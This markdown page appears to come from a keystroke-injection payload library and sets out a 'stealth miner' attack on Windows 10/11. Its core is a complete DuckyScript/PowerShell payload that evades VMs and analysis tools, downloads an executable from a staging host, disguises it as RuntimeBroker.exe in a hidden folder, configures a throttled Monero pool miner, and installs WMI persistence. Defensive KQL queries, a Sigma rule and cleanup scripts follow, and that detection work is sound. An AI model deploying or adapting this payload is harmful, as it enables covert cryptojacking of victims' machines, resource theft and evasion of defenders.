# EXP-D02: Stealth Miner Deployment

## Classification

| Attribute | Value |
|-----------|-------|
| Payload ID | EXP-D02 |
| Category | Cryptocurrency Mining (Evasive) |
| Target OS | Windows 10/11 |
| Complexity | Expert |
| Risk Level | High |
| MITRE ATT&CK | T1059.001, T1496, T1564.001, T1036.004 |

---

## Overview

This payload demonstrates advanced evasion techniques used by sophisticated mining malware, including process hollowing simulation, CPU throttling based on user activity, and system process name spoofing.

---

## Evasion Techniques Demonstrated

```
┌─────────────────────────────────────────────────────────────────────┐
│                    STEALTH MINER EVASION                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. PROCESS DISGUISE                                                │
│     ├── Rename to svchost.exe or RuntimeBroker.exe                 │
│     ├── Set process description to system process                   │
│     └── Run from System32-like directory                           │
│                                                                      │
│  2. CPU THROTTLING                                                  │
│     ├── Monitor user activity (mouse/keyboard)                     │
│     ├── High CPU when idle → Low CPU when active                   │
│     └── Pause mining during high-demand applications               │
│                                                                      │
│  3. NETWORK OBFUSCATION                                             │
│     ├── Use TLS/SSL to mining pool                                 │
│     ├── Domain fronting or proxy chains                            │
│     └── Low-frequency hash submissions                              │
│                                                                      │
│  4. ANTI-ANALYSIS                                                   │
│     ├── Detect VM/sandbox environments                             │
│     ├── Detect analysis tools (Process Monitor, etc.)              │
│     └── Self-delete if detected                                     │
│                                                                      │
│  5. PERSISTENCE HIDING                                              │
│     ├── WMI event subscriptions                                     │
│     ├── DLL hijacking                                               │
│     └── COM object hijacking                                        │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## The Payload (Educational Reference)

```
REM ========================================
REM EXP-D02: Stealth Miner with Evasion
REM Target: Windows 10/11
REM Purpose: Demonstrate advanced evasion for detection training
REM ========================================

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000

REM Stage 1: Anti-VM/Sandbox Check
STRING $vm = (Get-WmiObject Win32_ComputerSystem).Model
ENTER
STRING if ($vm -match "Virtual|VMware|VBox") { exit }
ENTER
DELAY 300

REM Stage 2: Check for analysis tools
STRING $tools = "procmon","wireshark","ida","x64dbg","processhacker"
ENTER
STRING foreach ($t in $tools) { if (Get-Process -Name $t -EA 0) { exit } }
ENTER
DELAY 300

REM Stage 3: Create hidden directory with system-like name
STRING $dir = "$env:LOCALAPPDATA\Microsoft\Windows\SystemApps\Services"
ENTER
STRING New-Item -ItemType Directory -Path $dir -Force -EA 0 | Out-Null
ENTER
STRING attrib +h +s $dir
ENTER
DELAY 300

REM Stage 4: Download and rename miner
STRING $url = "http://staging.example/payload.exe"
ENTER
STRING $miner = "$dir\RuntimeBroker.exe"
ENTER
STRING Invoke-WebRequest -Uri $url -OutFile $miner -UseBasicParsing
ENTER
DELAY 2000

REM Stage 5: Create throttling config
STRING $config = @"
ENTER
STRING {
ENTER
STRING     "cpu": {"enabled": true, "max-threads-hint": 25},
ENTER
STRING     "pause-on-battery": true,
ENTER
STRING     "pause-on-active": true,
ENTER
STRING     "pools": [{
ENTER
STRING         "url": "stratum+ssl://pool.supportxmr.com:443",
ENTER
STRING         "user": "WALLET_ADDRESS",
ENTER
STRING         "tls": true
ENTER
STRING     }]
ENTER
STRING }
ENTER
STRING "@
ENTER
STRING $config | Out-File "$dir\config.json" -Encoding UTF8
ENTER
DELAY 300

REM Stage 6: WMI persistence (stealthier than scheduled tasks)
STRING $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
ENTER
STRING     Name = "SystemUpdateCheck";
ENTER
STRING     EventNamespace = "root\cimv2";
ENTER
STRING     QueryLanguage = "WQL";
ENTER
STRING     Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
ENTER
STRING }
ENTER
DELAY 300

STRING $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
ENTER
STRING     Name = "SystemUpdateHandler";
ENTER
STRING     CommandLineTemplate = "$miner -c $dir\config.json"
ENTER
STRING }
ENTER
DELAY 300

STRING Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
ENTER
STRING     Filter = $filter;
ENTER
STRING     Consumer = $consumer
ENTER
STRING }
ENTER
DELAY 300

REM Stage 7: Start with activity monitoring wrapper
STRING $watcher = @'
ENTER
STRING while($true) {
ENTER
STRING     $idle = (New-Object -ComObject WScript.Shell).AppActivate("") 
ENTER
STRING     $cpu = (Get-Process -Name RuntimeBroker -EA 0 | ? {$_.Path -eq $miner}).CPU
ENTER
STRING     if (-not $cpu) { Start-Process -FilePath $miner -ArgumentList "-c $dir\config.json" -WindowStyle Hidden }
ENTER
STRING     Start-Sleep 300
ENTER
STRING }
ENTER
STRING '@
ENTER
STRING $watcher | Out-File "$dir\monitor.ps1"
ENTER
STRING Start-Process powershell -ArgumentList "-w hidden -ep bypass -File $dir\monitor.ps1" -WindowStyle Hidden
ENTER

STRING exit
ENTER
```

---

## Blue Team: Advanced Detection

### Enhanced Detection Points

```yaml
Evasion Awareness:
  
  Process Disguise Detection:
    - RuntimeBroker.exe running from non-system path
    - svchost.exe without -k parameter
    - System process with unusual parent
    - Process hash not matching known Microsoft binaries
    
  CPU Throttling Detection:
    - Variable CPU patterns correlating with user activity
    - High CPU during overnight/weekend hours
    - Power consumption anomalies
    
  WMI Persistence Detection:
    - New __EventFilter in root\subscription
    - CommandLineEventConsumer with executable
    - __FilterToConsumerBinding creation
    
  Network Evasion Detection:
    - TLS connections to unusual ports (3333, 4444 over 443)
    - Long-lived connections with periodic small data bursts
    - DNS queries to known pool domains
```

### Detection Queries

```kql
// Detect fake system processes
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName in ("RuntimeBroker.exe", "svchost.exe", "csrss.exe")
| where not(FolderPath startswith "C:\\Windows\\System32" or 
            FolderPath startswith "C:\\Windows\\SysWOW64")
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine

// Detect WMI persistence
DeviceEvents
| where ActionType == "WmiBindingCreated" or 
        ActionType == "WmiFilterCreated" or
        ActionType == "WmiConsumerCreated"
| where AdditionalFields contains "EventFilter" or
        AdditionalFields contains "CommandLineEventConsumer"
| project Timestamp, DeviceName, ActionType, AdditionalFields

// Detect hidden directories with system attributes
DeviceFileEvents
| where ActionType == "FileCreated"
| where FolderPath contains "\\Microsoft\\Windows\\" and
        FolderPath contains "\\AppData\\"
| where FileName endswith ".exe"
| project Timestamp, DeviceName, FolderPath, FileName

// Detect processes running from hidden paths
DeviceProcessEvents
| where FolderPath contains "\\AppData\\" and
        FolderPath contains "\\Microsoft\\Windows\\"
| where FileName endswith ".exe"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine
```

### Sigma Rule for Stealth Miner

```yaml
title: Stealth Cryptocurrency Miner Detection
id: exp-d02-stealth-miner
status: experimental
description: Detects stealth miner with evasion techniques
author: Security Training
logsource:
    product: windows
    service: sysmon
detection:
    selection_fake_sysprocess:
        EventID: 1
        Image|endswith:
            - '\RuntimeBroker.exe'
            - '\svchost.exe'
        Image|contains: '\AppData\'
        
    selection_wmi:
        EventID: 20
        EventType: WmiConsumerEvent
        
    selection_hidden_dir:
        EventID: 11
        TargetFilename|contains:
            - '\Microsoft\Windows\SystemApps\'
            - '\Microsoft\Windows\Services\'
        TargetFilename|endswith: '.exe'
        
    selection_activity_monitor:
        EventID: 1
        CommandLine|contains:
            - 'WScript.Shell'
            - 'pause-on-active'
            
    condition: selection_fake_sysprocess or selection_wmi or selection_hidden_dir or selection_activity_monitor
level: high
tags:
    - attack.defense_evasion
    - attack.t1564.001
    - attack.t1036.004
```

### WMI Persistence Detection Script

```powershell
# Detect WMI-based persistence
Write-Host "Checking for WMI persistence mechanisms..." -ForegroundColor Yellow

# Check Event Filters
$filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter
foreach ($filter in $filters) {
    if ($filter.Name -notmatch "^SCM Event Log|^BVTFilter") {
        Write-Host "[SUSPICIOUS] Event Filter: $($filter.Name)" -ForegroundColor Red
        Write-Host "  Query: $($filter.Query)" -ForegroundColor Gray
    }
}

# Check Event Consumers
$consumers = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
foreach ($consumer in $consumers) {
    Write-Host "[ALERT] CommandLine Consumer: $($consumer.Name)" -ForegroundColor Red
    Write-Host "  Command: $($consumer.CommandLineTemplate)" -ForegroundColor Gray
}

# Check Bindings
$bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
foreach ($binding in $bindings) {
    Write-Host "[ALERT] Binding found!" -ForegroundColor Red
    Write-Host "  Filter: $($binding.Filter)" -ForegroundColor Gray
    Write-Host "  Consumer: $($binding.Consumer)" -ForegroundColor Gray
}
```

---

## Blue Team: Removal

### WMI Persistence Removal

```powershell
# Remove WMI persistence (run as admin)
$namespace = "root\subscription"

# Find and remove suspicious bindings
Get-WmiObject -Namespace $namespace -Class __FilterToConsumerBinding | 
    Where-Object { $_.Filter -match "SystemUpdate" } | 
    Remove-WmiObject

# Remove consumers
Get-WmiObject -Namespace $namespace -Class CommandLineEventConsumer | 
    Where-Object { $_.Name -match "SystemUpdate" } | 
    Remove-WmiObject

# Remove filters
Get-WmiObject -Namespace $namespace -Class __EventFilter | 
    Where-Object { $_.Name -match "SystemUpdate" } | 
    Remove-WmiObject

Write-Host "WMI persistence removed" -ForegroundColor Green
```

### Complete Cleanup Script

```powershell
# Full stealth miner cleanup
$minerPath = "$env:LOCALAPPDATA\Microsoft\Windows\SystemApps\Services"

# Kill miner processes
Get-Process | Where-Object {
    $_.Path -like "*$minerPath*" -or
    ($_.Name -eq "RuntimeBroker" -and $_.Path -notlike "*System32*")
} | Stop-Process -Force

# Remove files
if (Test-Path $minerPath) {
    attrib -h -s $minerPath
    Remove-Item -Path $minerPath -Recurse -Force
    Write-Host "Miner files removed" -ForegroundColor Green
}

# Remove WMI persistence (see above)

# Scan for other instances
Get-ChildItem -Path $env:LOCALAPPDATA -Recurse -Filter "config.json" -EA 0 | 
    Where-Object { (Get-Content $_.FullName) -match "stratum|pool" } |
    ForEach-Object {
        Write-Host "[FOUND] Suspicious config: $($_.FullName)" -ForegroundColor Yellow
    }
```

---

## Summary

| Aspect | Details |
|--------|---------|
| Evasion | Process disguise, WMI persistence, CPU throttling |
| Detection Difficulty | High - requires behavioral analysis |
| Key Detection Points | Non-standard process paths, WMI subscriptions |
| Response Priority | Critical - sophisticated threat indicator |

---

[← XMRig Deploy](./EXP-D01_XMRig_Miner_Deploy.md) | [Next: Multi-Coin Miner →](./EXP-D03_Multi_Coin_Miner.md)
